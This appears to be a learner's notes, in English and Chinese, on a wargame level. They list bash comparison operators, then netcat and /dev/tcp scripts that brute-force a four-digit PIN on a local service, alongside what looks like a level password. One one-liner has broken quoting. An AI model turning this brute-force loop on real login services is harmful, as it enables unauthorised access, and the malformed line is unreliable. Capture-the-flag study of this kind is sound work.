```
-eq : Equal (等于)
-ne : Not Equal (不等于)
-lt : Less Than (小于)
-le : Less or Equal (小于等于)
-gt : Greater Than (大于)
-ge : Greater or Equal (大于等于)
```

```
  while [ $i -lt 10000 ]; do
      # printf "%04d" formats the number to 4 digits (e.g., 5 becomes 0005)
      formatted_i=$(printf "%04d" $i)
      echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $formatted_i"
      i=$((i + 1))
  done | nc localhost 30002
```
or 

`for i in {0000..9999}; do "echo "psw" $i"; done | ncat localhost 30001`

or, in realWolrd, post 10000+ line to server, the connexion are gonna breaked instantly
we could rise a STATEFUL SESSION
```
/dev/tcp
# (建立连接，并把这个连接命名为通道 3)
exec 3<>/dev/tcp/localhost/30002

# (从通道 3 读取服务器的欢迎语)
read welcome_msg <&3
echo "Server said: $welcome_msg"

# (向通道 3 发送一次尝试)
echo "psw 1234" >&3

# 4. Read the server's feedback
read feedback <&3
echo "Server replied: $feedback"

# 5. Close the session when you are done
# (关闭连接)
exec 3>&-
```

####the finale
```
#!/bin/bash

PASSWORD="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

# Open the session (Handshake)
exec 3<>/dev/tcp/localhost/30002

# Read the initial welcome message to clear the buffer
read welcome <&3

i=0
while [ $i -lt 10000 ]; do
    # Format the pin
    pin=$(printf "%04d" $i)
    
    # Send the attempt
    echo "$PASSWORD $pin" >&3
    
    # Read the response
    read response <&3
    
    # Check if the response does NOT contain the word "Wrong"
    if [[ "$response" != *"Wrong"* ]]; then
        echo "SUCCESS! The PIN is $pin"
        echo "Server said: $response"
        break # Stop the loop!
    fi
    
    i=$((i + 1))
done

# Close the session
exec 3>&-
```
